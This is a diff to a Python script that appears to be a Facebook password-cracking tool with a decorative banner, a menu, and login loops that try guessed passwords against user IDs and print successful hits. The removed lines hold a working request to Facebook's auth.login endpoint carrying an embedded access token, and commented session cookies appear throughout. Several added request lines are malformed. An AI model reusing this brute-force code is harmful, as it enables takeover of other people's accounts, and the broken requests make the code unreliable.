@@ -382,13 +382,13 @@ logo = """\033[1;30m
     \033[0;93mCHAUDHARY[✓]New Free Command enjoy™️
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[0;32m8888888b.  888     888 888888b.    .d8888b.  
-\033[0;33m888   Y88b 888     888 888  "88b  d88P  Y88b 
-\033[0;34m888    888 888     888 888  .88P  888    888 
-\033[0;35m888   d88P 888     888 8888888K.  888        
-\033[0;36m8888888P"  888     888 888  "Y88b 888  88888 
-\033[0;37m888        888     888 888    888 888    888 
+\033[0;33m888   Y88b 888     888 888  "88b  d88P  Y88b      ______________  __
+\033[0;34m888    888 888     888 888  .88P  888    888      __  ____/__  / / /
+\033[0;35m888   d88P 888     888 8888888K.  888             _  /    __  /_/ / 
+\033[0;36m8888888P"  888     888 888  "Y88b 888  88888      / /___  _  __  /  
+\033[0;37m888        888     888 888    888 888    888      \____/  /_/ /_/   
 \033[0;33m888        Y88b. .d88P 888   d88P Y88b  d88P 
-\033[0;39m888         "Y88888P"  8888888P"   "Y8888P88     𓊈𒆜🆃🅰🅱🅸🆂🅷𒆜𓊉
+\033[0;36m888         "Y88888P"  8888888P"   "Y8888P88   𓊈𒆜🆃🅰🅱🅸🆂🅷𒆜𓊉
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;39m━▷ \033[0;92m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m Ch Tabish
 \033[1;39m━▷ \033[0;92m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;33m TEAM OF CHAUDHARY 
@@ -418,7 +418,7 @@ class Main:
 		print(" \033[1;39m━▷\033[1;31m [0] Exit")
 		print("")
 		baloch = input("\n\033[1;37m  \033[1;38mChoice \033[1;37m━━> \033[1;32m")
-		if baloch in ["", " "]:
+		if baloch in ["https://youtube.com/@tabish3301?si=5oqBfnIIZxucVYwH"]:
 			exit()
 		elif baloch in ["2", "02"]:
 			print("    CHAL BAGH 🤭")
@@ -859,11 +859,11 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-    'authority': 'p.facebook.com',
+    'authority': 'm.alpha.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=VqV6ZeIhEN3hPld1Q3AdL_hm; sb=VqV6ZXxQC-Ao1GxTKzDBTRFQ; m_pixel_ratio=2.8125; zsh=ASTYTHHpjuXEykLTbJhnxRCmDWd_o_iSqtJw8Igu7IvZEdZ0ZG09R8MqiXxMvzY0lbduo8McmPdVSwZQ6BL2au27WlnE1tquDjKXc2t0j8zgLqsrJ9IymhWN7Q2aMspLGWxMouFmhK5yOGhXmOcn6ADZB5d_KPClt0-G9PPRIGK_-udFH1wx2IN9vbomx4APjqqKp62RJJU_i-V605udUhZ2-38t8eHT2dpHLQiXhMsjhuKxmYPpZzektwzr8gViGbrGHDm16EPVpk8DIfO9MTXYmwYQ8upkHjqmpXxm2ITTACYcxiQIvLCo7Brx4OKU; locale=en_US; wl_cbv=v2%3Bclient_version%3A2376%3Btimestamp%3A1702536671; vpd=v1%3B745x384x2.8125; wd=384x745; fr=0wSvARiHMHejeG4dl.AWWQuX655r4ez0llhIlaK95ZYsk.BleqVW.mP.AAA.0.0.BleqfT.AWWI1x80w0Q',
+    # 'cookie': 'datr=p_F6ZVcY0gWnwB5epftPtG4_; sb=p_F6ZaYbjpM9GISFQ9CGCgOg; m_pixel_ratio=2.8125; wd=384x745; fr=0hAjpmYwSLZIOZm8L..BlevGn.eK.AAA.0.0.BlevG6.AWXs0ZBGxog',
     'dpr': '2.8125',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
@@ -879,7 +879,7 @@ class Main:
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',}
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			response = ses.get("https://m.alpha.facebook.com/', cookies=cookies, headers=headers") 
 			if "session_key" in response.text and "EAA" in response.text:
 				print("\r \033[0;92m[Ch Tabish-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
@@ -1301,16 +1301,27 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
-			}
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+    'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=Je96ZV9R7LuOIpEML5j0BFzR; sb=Je96ZYJk78YxpmliBN4ql8kO; m_pixel_ratio=2.8125; wd=384x745; fr=0jJTxeixxM2jft5HP..Bleu8l.5p.AAA.0.0.Bleu8o.AWX-VBLJdio',
+    'dpr': '2.8125',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"IN2019"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
+			response = ses.get("https://mbasic.facebook.com/', cookies=cookies, headers=headers") 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[Chaudhary-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
